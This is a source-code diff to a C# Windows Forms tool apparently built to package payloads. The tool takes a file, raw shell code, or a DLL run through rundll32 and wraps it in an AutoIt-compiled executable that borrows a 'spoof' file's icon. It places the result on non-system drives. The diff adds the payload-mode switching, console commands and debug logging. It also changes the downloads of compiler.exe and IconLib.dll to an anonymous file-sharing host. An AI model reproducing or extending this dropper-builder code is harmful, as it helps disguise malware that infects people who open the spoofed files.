@@ -1,4 +1,4 @@
-﻿//#define isdbg //NOTE: DO NOT FORGET TO UNDEFINE (comment out) THIS ON RELEASE.
+﻿#define isdbg //NOTE: DO NOT FORGET TO UNDEFINE (comment out) THIS ON RELEASE.
 using System;
 using System.Collections.Generic;
 using System.ComponentModel;
@@ -6,7 +6,6 @@ using System.Data;
 using System.Drawing;
 using System.Linq;
 using System.Text;
-using System.Threading.Tasks;
 using System.Windows.Forms;
 using System.IO;
 using System.Diagnostics;
@@ -22,9 +21,10 @@ namespace masamangalternatibo {
         public Form1() { InitializeComponent(); }
 
         string version = "1.0";
-        bool payloadMode = true; // true = File payload // false = Shell Code payload
+        int payloadMode = 0; // 0 = File payload // 1 = Shell Code payload // 2 = Load DLL to rundll32
+        string[] payloadData = new string[5]; // Stores the data from the textbox so the user can switch modes without losing the last settings
+        string[] payloadFile = new string[2]; // Stores the data of ofdPayload.FileName incase the user switches modes // 0 = File Payload // 1 = DLL Payload
         bool icolibexist = false;
-        string lastPayloadContainer;
         int overflowCount = 20;
         string apth = Application.StartupPath;
 
@@ -34,16 +34,69 @@ namespace masamangalternatibo {
             loadDrives();
             checkComponents();
             #if !(isdbg)
-             using (about _form = new about()) {
-                dbgmsg("Showing about form...");
-                _form.ShowDialog();
-            }
+                dbgmsg("Setting up...");
+                tbPayload.ReadOnly = true;
+                tbSpoof.ReadOnly = true;
+                using (about _form = new about()) {
+                    dbgmsg("Showing about form...");
+                    _form.ShowDialog();
+                }
             #endif
             dbgmsg("mA Ready! // Hover an item for more information!");
             #if isdbg
             dbgmsg("mA is running in debugging mode!");
             #endif
         }
+
+        #region [Console Commands]
+        private void btnConsole_Click(object sender, EventArgs e) {
+            string[] con = tbConsole.Text.Split(' ');
+            switch ((con[0]).ToLower()) {
+
+                case "showpayloadfile":
+                    dbgmsg("payloadFile[0]=" + payloadFile[0]);
+                    dbgmsg("payloadFile[1]=" + payloadFile[1]);
+                    break;
+
+                case "owo":
+                    dbgmsg("OwO ~ what's this?");
+                    break;
+
+                case "setdrive":
+                    drpDrives.Items.Add(con[1]);
+                    drpDrives.SelectedIndex = drpDrives.Items.Count - 1;
+                    dbgmsg("Override command -- Drive selection set and added -- " + con[1]);
+                    break;
+
+                case "exit":
+                    Application.Exit();
+                    break;
+
+                case "setoverflowcount":
+                    overflowCount = Convert.ToInt32(con[1]);
+                    dbgmsg("Overflow loop count changed to " + con[1]);
+                    break;
+
+                case "setimagelocation":
+                    imgFileIcon.ImageLocation = con[1];
+                    dbgmsg("Image location set : " + con[1]);
+                    break;
+
+                case "cls":
+                    dbgRtb.Text = "";
+                    break;
+
+                case "dbgcd":
+
+                    break;
+
+                default:
+                    dbgmsg("Bad command! Available commands:\nsetdrive [driveletter]\nsetoverflowcount [integer]\nsetimagelocation [filepath]\nshowpayloadfile\ncls\nexit\n");
+                    break;
+            }
+            tbConsole.Text = "";
+        }
+        #endregion
 
         //Extract Icon Function - used to extract icons by utilizing the IconLib Library
         private void extractIcon(bool fromButton = false, string iconfile = "") {
@@ -79,54 +132,11 @@ namespace masamangalternatibo {
             return tmp;
         }
 
-        #region [Console Commands]
-        private void btnConsole_Click(object sender, EventArgs e) {
-            string[] con = tbConsole.Text.Split(' ');
-            switch ((con[0]).ToLower()) {
-                case "owo":
-                    dbgmsg("OwO ~ what's this?");
-                    break;
-
-                case "setdrive":
-                    drpDrives.Items.Add(con[1]);
-                    drpDrives.SelectedIndex = drpDrives.Items.Count - 1;
-                    dbgmsg("Override command -- Drive selection set and added -- " + con[1]);
-                    break;
-
-                case "exit":
-                    Application.Exit();
-                    break;
-
-                case "setoverflowcount":
-                    overflowCount = Convert.ToInt32(con[1]);
-                    dbgmsg("Overflow loop count changed to " + con[1]);
-                    break;
-
-                case "setimagelocation":
-                    imgFileIcon.ImageLocation = con[1];
-                    dbgmsg("Image location set : " + con[1]);
-                    break;
-
-                case "cls":
-                    dbgRtb.Text = "";
-                    break;
-
-                case "dbgcd":
-                   
-                    break;
-
-                default:
-                    dbgmsg("Bad command! Available commands:\nsetdrive [driveletter]\nsetoverflowcount [integer]\nsetimagelocation [filepath]\ncls\nexit\n");
-                    break;
-            }
-            tbConsole.Text = "";
-        }
-        #endregion
-
         //Check Component Function - Checks the required external components of mA
         private void checkComponents() {
-            string dl1 = "https://github.com/tragenalpha/masamangalternatibo/raw/master/Aut2Exe/compiler.exe"; //DL Link for the Compiler
-            string dl2 = "https://github.com/tragenalpha/masamangalternatibo/raw/master/IconLib/IconLib.dll"; //DL Link for the Library
+            //Temporary download links // TODO: Get proper host
+            string dl1 = "http://s000.tinyupload.com/download.php?file_id=00939372756596617781&t=0093937275659661778155214"; //DL Link for the Compiler
+            string dl2 = "http://s000.tinyupload.com/download.php?file_id=55274642882580256800&t=5527464288258025680042888"; //DL Link for the Library
             dbgmsg("Checking for compiler...");
             if (!(File.Exists("compiler.exe"))) {
                 if (MessageBox.Show("An important component of mA is missing!\n\nThe AutoIt compiler (compiler.exe) was not found, you cannot use mA with out the compiler as it needs to compile scripts to standalone executables.\n\nPressing Yes will download the compiler from this link\n" + dl1 + "\n\nThis will be downloaded in the background.", "Script compiler missing! // Download component \"compiler.exe\" (1.32mb)", MessageBoxButtons.YesNo) == DialogResult.Yes) {
@@ -194,38 +204,55 @@ namespace masamangalternatibo {
             dbgmsg("Detecting drives...");
             drpDrives.Items.Clear();
             for (int i = 65; i <= 90; i++) {
-                if (Directory.Exists(((char)i).ToString() + ":\\")) {
+                if (Directory.Exists(((char)i).ToString() + ":\\") && i != 67) {
                     drpDrives.Items.Add(((char)i).ToString() + ":\\");
                 }
             }
-            drpDrives.SelectedIndex = 0;
+            if (drpDrives.Items.Count != 0) { drpDrives.SelectedIndex = 0; }
             dbgmsg("Finished!");
         }
 
         private void btnSwitchMode_Click(object sender, EventArgs e) {
-            string tmpStore;
-            if (payloadMode) {
-                payloadMode = false;
-                btnSwitchMode.Text = "S";
-                btnBrowsePayload.Enabled = false;
-                tbPayload.ReadOnly = false;
-                lblPayload.Text = "Shell Code:";
-                tmpStore = lastPayloadContainer;
-                lastPayloadContainer = tbPayload.Text;
-                tbPayload.Text = tmpStore;
-                pnlFileOptGroup.Enabled = false;
+
+            payloadData[payloadMode] = tbPayload.Text; //Store the different payloadMode's data here so the user doesn't have to go back and forth
+
+            payloadMode++;
+            if (payloadMode == 3) { payloadMode = 0; }
+
+            switch (payloadMode) {
+
+                case 0: //Payload File Mode
+                    ofdPayload.FileName = payloadFile[payloadMode];
+                    btnSwitchMode.Text = "F";
+                    btnBrowsePayload.Enabled = true;
+                    tbPayload.ReadOnly = true;
+                    lblPayload.Text = "Payload File:";
+                    pnlFileOptGroup.Enabled = true;
+                    ofdPayload.Filter = "All Files (*.*)|*.*";
+                    break;
+
+                case 1: //Inject Library Mode
+                    ofdPayload.FileName = payloadFile[payloadMode];
+                    btnSwitchMode.Text = "D";
+                    btnBrowsePayload.Enabled = true;
+                    tbPayload.ReadOnly = true;
+                    lblPayload.Text = "DLL File:";
+                    pnlFileOptGroup.Enabled = false;
+                    ofdPayload.Filter = "DLL Files (*.dll)|*.dll";
+                    break;
+
+                case 2: //Shell Code Mode
+                    btnSwitchMode.Text = "S";
+                    btnBrowsePayload.Enabled = false;
+                    tbPayload.ReadOnly = false;
+                    lblPayload.Text = "Shell Code:";
+                    pnlFileOptGroup.Enabled = false;
+                    break;
+
+               
             }
-            else {
-                payloadMode = true;
-                btnSwitchMode.Text = "P";
-                btnBrowsePayload.Enabled = true;
-                tbPayload.ReadOnly = true;
-                lblPayload.Text = "Payload File:";
-                tmpStore = lastPayloadContainer;
-                lastPayloadContainer = tbPayload.Text;
-                tbPayload.Text = tmpStore;
-                pnlFileOptGroup.Enabled = true;
-            }
+
+            tbPayload.Text = payloadData[payloadMode]; //Display the data of the currently selected payloadMode
         }
 
         private void btnRefreshDrives_Click(object sender, EventArgs e) {
@@ -259,11 +286,14 @@ namespace masamangalternatibo {
 
         private void ofdPayload_FileOk(object sender, CancelEventArgs e) {
             tbPayload.Text = ofdPayload.SafeFileName;
+            payloadFile[payloadMode] = ofdPayload.FileName;
+            dbgmsg("Payload File Selected:" + ofdPayload.FileName);
         }
 
         private void ofdSpoof_FileOk(object sender, CancelEventArgs e) {
             tbSpoof.Text = ofdSpoof.SafeFileName;
             extractIcon(false, ofdSpoof.FileName);
+            dbgmsg("Selected Spoof File:" + ofdSpoof.FileName);
         }
 
         private void btn3rdParty_Click(object sender, EventArgs e) {
@@ -306,6 +336,7 @@ namespace masamangalternatibo {
             File.Copy(ofdIcon.FileName, "$tmp.ico");
             dbgmsg("Loading image...");
             imgFileIcon.ImageLocation = "$tmp.ico";
+            dbgmsg("Imported:" + ofdIcon.FileName);
         }
 
         private void btnExtract_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e) {
